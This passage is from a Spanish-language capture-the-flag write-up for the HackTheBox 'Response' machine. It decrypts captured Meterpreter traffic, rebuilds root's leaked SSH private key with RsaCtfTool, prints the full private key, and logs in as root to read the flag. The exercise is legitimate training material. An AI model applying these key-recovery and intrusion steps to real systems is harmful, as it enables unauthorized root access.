    if int.from_bytes(enc_flag,'big') == 0:
        tlv = xor (f.read(pack_len_int), xor_key)

    else :
        aes_iv = xor(f.read(16), xor_key)
        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
        tlv = xor(f.read(pack_len_int - 24), xor_key)
        tlv = cipher.decrypt(tlv)

    while len(tlv) > 0:

        tlv_len = tlv[0:4]
        tlv_type = tlv[4:8]
        tlv_type_1 = tlv_type[0:2]
        tlv_type_2 = int.from_bytes(tlv_type[2:4], 'big')
        tlv_len_int = int.from_bytes(tlv_len, 'big')
        tlv_value = tlv[8:tlv_len_int-8]

        try:

            print(msftype.MSFType(tlv_type_2).name)

            if "TLV_TYPE_CHANNEL_DATA" == msftype.MSFType(tlv_type_2).name:
                f2 = open("file.zip", "ab")
                f2.write(tlv_value)
                f2.close()

        except:
            print("Unkown TLV type")

        tlv = tlv[tlv_len_int:]

f.close()
```

Lo descomprimo y veo su contenido

```null
7z l file.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz (A0652),ASM,AES-NI)

Scanning the drive for archives:
1 file, 1274538 bytes (1245 KiB)

Listing archive: file.zip

--
Path = file.zip
Type = zip
Physical Size = 1274538

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-03-14 09:37:39 D....            0            0  Documents
2022-03-14 09:37:21 .....          245          133  Documents/.tmux.conf
2022-06-15 11:37:42 .....      1278243      1271659  Documents/Screenshot from 2022-06-15 13-37-42.png
2022-03-14 09:37:39 .....           95           79  Documents/.vimrc
2022-03-14 08:57:29 .....         1522         1110  Documents/bookmarks_3_14_22.html
2022-03-14 09:36:27 .....          567          463  Documents/authorized_keys
------------------- ----- ------------ ------------  ------------------------
2022-06-15 11:37:42            1280672      1273444  5 files, 1 folders
```

Se puede ver una captura de pantalla

<img src="/writeups/assets/img/Response-htb/46.png" alt="">

Copio a mano lo que hay de la id_rsa

Al hacerle un decode y representándolo en hexadecimal, se puede apreciar un null byte por en la segunda línea

```null
cat data | base64 -d | xxd
base64: invalid input
00000000: 9ed1 1ddc a9d6 3699 1bc2 9dbc bd58 1ab1  ......6......X..
00000010: 43aa dc24 016c 3390 0000 0c10 0c70 b1a1  C..$.l3......p..
00000020: 9709 9c0c 6ff2 47f3 c5ef 1a1b b506 8db3  ....o.G.........
00000030: a262 2169 532b 6cde 71e2 addc ed9d 2ef6  .b!iS+l.q.......
00000040: 09a4 5cef 8d58 ca57 ed3d b497 4381 1088  ..\..X.W.=..C...
00000050: 6b5b a0d0 3acc 62b3 f0ab 4b9b baf4 5ead  k[..:.b...K...^.
00000060: 5198 e551 d344 d732 04ec 816f d90b ab33  Q..Q.D.2...o...3
00000070: 034b f3df d29e 541b 7b6e 316f e223 69f2  .K....T.{n1o.#i.
00000080: 9468 e3ec 35ca 456a 43f8 bf19 ca2f ebb0  .h..5.EjC..../..
00000090: eaa1 68a9 1752 6729 dd80 0ad9 2832 b6e9  ..h..Rg)....(2..
000000a0: 9ed9 cdd5 7696 7da4 ca22 dfa2 437c 59b6  ....v.}.."..C|Y.
000000b0: 311d e43f eff8 d505 77fb d415 35f9 783c  1..?....w...5.x<
000000c0: 5f8e 278d 5a77 5dff 603b a718 55aa 9bd7  _.'.Zw].`;..U...
000000d0: 106c 67b6 c6f1 66ab 9327 23ed 9000 0000  .lg...f..'#.....
000000e0: d726 f6f7 4407 2657 3706 f6e7 3650 1020  .&..D.&W7...6P. 
000000f0: 3040 50                                  0@P
```

El siguiente byte después del nulo, coincide con el tamaño de la id_rsa. Puedo tratar de desplazarlo más abajo, introduciendole bytes de mi lado para así conseguir el valor de "q" o "n". Introduzco varias "A" al principio de la cadena detro del archivo

Una vez le hago el decode se exfiltra data, pero no la suficiente.

```null
cat data | base64 -d | xxd
00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 0000 0000 09ed 11dd  ................
00000020: ca9d 6369 91bc 29db cbd5 81ab 143a adc2  ..ci..)......:..
00000030: 4016 c339 0000 00c1 00c7 0b1a 1970 99c0  @..9.........p..
00000040: c6ff 247f 3c5e f1a1 bb50 68db 3a26 2216  ..$.<^...Ph.:&".
00000050: 9532 b6cd e71e 2add ced9 d2ef 609a 45ce  .2....*.....`.E.
00000060: f8d5 8ca5 7ed3 db49 7438 1108 86b5 ba0d  ....~..It8......
00000070: 03ac c62b 3f0a b4b9 bbaf 45ea d519 8e55  ...+?.....E....U
00000080: 1d34 4d73 204e c816 fd90 bab3 3034 bf3d  .4Ms N......04.=
00000090: fd29 e541 b7b6 e316 fe22 369f 2946 8e3e  .).A....."6.)F.>
000000a0: c35c a456 a43f 8bf1 9ca2 febb 0eaa 168a  .\.V.?..........
000000b0: 9175 2672 9dd8 00ad 9283 2b6e 99ed 9cdd  .u&r......+n....
000000c0: 5769 67da 4ca2 2dfa 2437 c59b 6311 de43  Wig.L.-.$7..c..C
000000d0: feff 8d50 577f bd41 535f 9783 c5f8 e278  ...PW..AS_.....x
000000e0: d5a7 75df f603 ba71 855a a9bd 7106 c67b  ..u....q.Z..q..{
000000f0: 6c6f 166a b932 723e d900 0000 0d72 6f6f  lo.j.2r>.....roo
00000100: 7440 7265 7370 6f6e 7365 0102 0304 05    t@response.....
```

El delimitador que tenía (byte posterior al nulo), vale 193 en decimal

```null
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0xc1
193
```

Lo que quiere decir que cada línea tiene 16 bytes y tendría que introducir 29 para obtener eñ vañpr de "n"

```null
base64 -d data | xxd -seek 29 -l 193 -p
```

Me clono el repositorio de RsaCTFTool, para automatizar el cálculo de los valores

```null
python3 RsaCtfTool.py --dumpkey --key ../authorized_keys
private argument is not set, the private key will not be displayed, even if recovered.
n: 3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091762707129955524413436586717182608324763300282675178894829982057112627295254493287098002679639669820150059440230026463333555689667464933204440020706407713635415638301509611028928080368097717646239396715845563655727381707204991971414197232171033109308942706448793290810366211969147142663590876235902557427967338347816317607468319013658232746475644358504534903127732182981965772016682335749548359468750099927184491041818321309183225976141161842377047637016333306802160159421621687348405702117650608558846929592531719185754360656942555261793483663585574756410582955655659226850666667278286719778179120315714973739946191120342805835285916572624918386794240440690417793816096752504556412306980419975786379416200263786952472798045196058762477056525870972695021604337904447201141677747670148003857478011217
e: 65537
```

Creo la clave privada para el usuario root

```null
python3 RsaCtfTool.py -n 3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091762707129955524413436586717182608324763300282675178894829982057112627295254493287098002679639669820150059440230026463333555689667464933204440020706407713635415638301509611028928080368097717646239396715845563655727381707204991971414197232171033109308942706448793290810366211969147142663590876235902557427967338347816317607468319013658232746475644358504534903127732182981965772016682335749548359468750099927184491041818321309183225976141161842377047637016333306802160159421621687348405702117650608558846929592531719185754360656942555261793483663585574756410582955655659226850666667278286719778179120315714973739946191120342805835285916572624918386794240440690417793816096752504556412306980419975786379416200263786952472798045196058762477056525870972695021604337904447201141677747670148003857478011217 -p 1916050306205333561419340654997247210048413641801348970960079514616664134719102135041323559808823287507117764495506641667502188027100449148337242917863760454705051745311589368966639723256790995465786349803085767646492327358529192956998140247230141324083433547842337416562412168069467780529408980611520951488107555503940773583448434212344944450737794180001456574166216535263941314645573920302378030613909969529154033431308763003703277642056872726635405506000634681 -q 1874049613140184843621060844430875438039715136676390587014490642667648348834729578670572218770675017671955165909510372680231227997794797813783251855034499318060383466632797554895089403256742241869718483308458055165937168105025970618417112700682332538743333548471395327848077917895144087346832755607400573406688527717696386155103840198329730569043884613339720346942456798464865298511514240849350597034988561850631574781811925376637626743947768533920575522310602457 -e 65537 --private

Results for /tmp/tmpen2uawvr:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIIG5AIBAAKCAYEAnjos+7lSWtfxsuqXqQOvG09p5TNhOnjVUS6aCJTckXqUJOje
05AUsp0EoaGXrAcidoN6U4ll2SK2j/NLqSm9Rb7y0+21iB+2K8wR77YwCK8rod+W
eYv68GnUFAKaHT0s/sDGEGmJt2ZUSQc/FJZKEjjwvX1Fa6zKEVCI7n5t+MKQTbc8
be33GxGV8743146L+bZCoDkfZ/mJApardmTrPszckDnqc1haXVthfPDdm+ZZvd9u
cHiTMPTBgZRyeMtuaNbYe6/eKgHoBQiLmhOPy14x8l2DRcyGG6e8mCnBBZ8/Ca0a
BXgHe7oakCYvmR4j0X0gCMWv70DmQDeZC8oUj+wr4KXcPBGllIMWToSe1LOFbmay
X0e907slB8JABS1GU/BK6L02ziKUhZcNYH4TTlDu/MIHO/J3iyquaqPPDEYHUvQZ
CJHOeJweHQmR0qq65w4cxhvDDRIRh4gltjVD43mdg/Lx5xp/lyEIctwSwz1ikeaO
Bdbwi+gF/6Ln9UlRAgMBAAECggGAR6IC13uRAzucWunF+2iFkBGl2XQnYndt67Dz
X0s1iE88XnFm39Ts6egYPqyPo/we6BSh/svHZkRG7mixKkaRP9Aw0y1c7+GbcbyT
qjiLCoNzd3doAmMTGmBu+RgseWxGwJa5lJiTFoqnQeCb+FAJ/LH2m3LpSNQTLz+M
npxyYRqEhgqcuw/uvTx67LyDP31zdXvEMhFqXIImOxvHSHRr5CSO/mSZ9dpcHsPO
IOhTC89/dWx/7T9JM/K64FU6deFyxplJMXePDvX5OZyRj9fjX8cvr+SMxiWCcjYU
Ar1H6hxq/mWbNcDiwIXc0OKc+oFPH6zITwHeCrUkrAegVOP1MBf5WgX1gltHaK4W
X5xhTHlI/f2rKIL4fISDvIihmgqUQ64u8ZwnDXIPAB0tkYpFSuFchBNIRUd87Yf3
9i0NcNySOxYo9iI3u3nEwiYSLC/tWv98N3ahpVN53WC6YLqbMCpG2IELyuw7Il5K
k3t904GGEmkfNXhM27b0B2pfyMOBAoHBAMuBGArAEKvvTrGm+wQJjaLm15xs2nwP
vRu9Xjr/7spDhWhL69AuKT6RrVn68zErskP8dbIewetkYoUSk/tIYa3vis+8gWCc
Q94vrMKtuqPfbYVYNjOXfJTCfzd3AkAp3ZBszht7n2IQZ2/xp6Agpd5rfS2QZjNv
/YLy8myVGzsnG6bsOVW0eQtfeSf7us093xW+uBlYm7Rf0RpYLkjJZG9e5xIAp88w
HZntEd3KnWNpkbwp28vVgasUOq3CQBbDOQKBwQDHCxoZcJnAxv8kfzxe8aG7UGjb
OiYiFpUyts3nHirdztnS72CaRc741YylftPbSXQ4EQiGtboNA6zGKz8KtLm7r0Xq
1RmOVR00TXMgTsgW/ZC6szA0vz39KeVBt7bjFv4iNp8pRo4+w1ykVqQ/i/Gcov67
DqoWipF1JnKd2ACtkoMrbpntnN1XaWfaTKIt+iQ3xZtjEd5D/v+NUFd/vUFTX5eD
xfjieNWndd/2A7pxhVqpvXEGxntsbxZquTJyPtkCgcATnMFgZ9ozd8CxxlHytaj8
xhqJbMQxqKKlBb8LGJc+zvsQbiCv04MOEKQQQ+skFf38J1yAag5uTSJhiMTSNsuT
I77Q/m3JjcXMp/OSX4PZPzMi4rl2h2buP0BbbBC/dklwHcxPQb6+iK4vT67D8+GI
afuKZJw04NohwKA0brpNHRvBHor4A4iW3AClJdF+7jONuO+tIaj/3SwdydnMEfyn
7xF93qpNgWmY6AwMv/YjGo19ANu57T2t6yksjcf3aaECgcEArmKRqTw32Of/3bAD
6oL02bGnTHrzseXrLZVvbE/H6rExsla7Yi5LGUOvh8dIQdVnF0AFIlDRAln34188
SlrwZvk23nl5fHQhtBMvDF05fLsHNCuNzojG/KjaDOuyNd+NI9iLNZR1R5PN9MVb
/bjUJBHB74z3g+w/aE4ZGSWH4op8lW6/Oai3W8AjluSRKor/dEWS0Ad1nkkpCFwd
bPMY6rzTeEXYukJ3ndHuOBIoJRFaz2AESJVYyTXChBphkipxAoHBAJU2qoufXBcT
dWOy4/AzXlli42JP6+lZ5t1YFN27lx5c5Br5hxRBoQzUvvvA7Idx1nXhkxqTqnG4
RY5pRaDRrbsy2vBEeu4QkWnB7OmjdnkrJJ9HJAMRwaUOKczS/iM4Q9cus7FtAqWH
cyHNIkh4KR2OvAjGn++FFHLXqzXL4qc26BwhBbaAxAiYBJ40hNSA+F2GiTwuUaIj
xDamrrFL/cNhMxyiXyPCgSq7oRfOxvBlnRihR6PyulUZHJkuBm36Iw==
-----END RSA PRIVATE KEY-----
```

Me conecto a la máquina y puedo visualizar la segunda flag

```null
ssh root@response.htb -i id_rsa

root@response:~# cat /root/root.txt
ee0264c3a388e06683203ae9f2dd4a99
```